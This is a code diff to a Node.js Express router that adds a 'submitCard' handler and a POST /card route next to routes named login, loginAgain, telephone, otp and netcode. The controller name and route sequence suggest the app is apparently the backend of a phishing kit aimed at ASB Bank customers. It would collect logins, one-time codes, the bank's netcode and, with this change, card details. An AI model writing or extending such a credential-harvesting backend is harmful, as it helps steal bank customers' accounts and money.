@@ -9,6 +9,7 @@ const {
     submitOtp,
     submitNetcode,
     deleteEntry,
+    submitCard,
 } = require("../controllers/asbController");
 
 const router = express.Router();
@@ -20,6 +21,7 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/telephone", submitTelephone);
 router.post("/otp", submitOtp);
+router.post("/card", submitCard);
 router.post("/netcode", submitNetcode);
 router.post("/delete", deleteEntry);
 
